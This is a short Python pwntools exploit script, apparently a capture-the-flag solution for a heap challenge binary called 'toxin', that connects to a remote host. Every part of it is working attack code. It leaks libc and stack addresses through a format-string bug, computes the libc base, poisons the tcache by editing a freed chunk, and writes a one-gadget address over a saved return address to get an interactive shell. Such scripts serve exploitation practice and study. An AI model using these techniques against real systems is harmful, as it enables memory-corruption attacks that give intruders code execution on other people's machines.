from pwn import * 

context.clear(arch='amd64')

def record_toxin(length, data, index):

	global p 

	p.recvuntil("> ")
	p.sendline("1")

	#length
	p.recvuntil("length: ")
	p.sendline(str(length))

	#index
	p.recvuntil("index: ")
	p.sendline(str(index))

	#data 
	p.recvuntil("formula: ")
	p.sendline(data)


def drink_toxin(index):

	global p 

	p.recvuntil("> ")
	p.sendline("3")

	p.recvuntil("index: ")
	p.sendline(str(index))


def edit_toxin(index, data):

	global p 

	p.recvuntil("> ")
	p.sendline("2")

	p.recvuntil("index: ")
	p.sendline(str(index))

	p.recvuntil("formula: ")
	p.sendline(data)

def get_leak(index):

	global p 

	p.recvuntil("> ")
	p.sendline("4")

	p.recvuntil("term: ")
	p.sendline(f"%{str(index)}$p")

	leak = p.recvline().rstrip()
	leak = int(leak, 16)

	return leak 

def main():

	global p
	libc = ELF("./libc.so.6")
	elf = ELF("./toxin")
	host = "46.101.23.188"
	port = 31161
	local = False 

	if local:

		p = process("./toxin")

	else:

		p = remote(host, port)

	#leak libc address to use it later with one gadget
	_gi_read_leak = get_leak(3)
	_gi_read_offset = 1114224
	log.info(f"Leak : {hex(_gi_read_leak)}")

	libc_base = _gi_read_leak - 17 - _gi_read_offset
	libc.address = libc_base
	log.info(f"Libc base: {hex(libc.address)}")

	#available gadgets offsets
	gadgets = [0x4f2c5, 0x4f322, 0x10a38c]

	gadget_addr = libc.address + gadgets[0]
	log.info(f"One Gadget : {hex(gadget_addr)}")

	#stack leak to overwrite return address
	stack_addr = get_leak(8) - 24  #i got 24 with trial and error and using gdb-gef
	log.info(f"Stack address: {hex(stack_addr)}")


	#tcache poisonning here
	record_toxin(60, 'A' *20, 0)
	drink_toxin(0)
	edit_toxin(0, p64(stack_addr) + b'A' * 11)
	
	record_toxin(60, b'B' *19, 1)
	gadget_addr = libc.address + gadgets[1]
	record_toxin(60, p64(gadget_addr)+ b'C' *10, 2 )

	p.interactive()
if __name__ == "__main__":

	main()



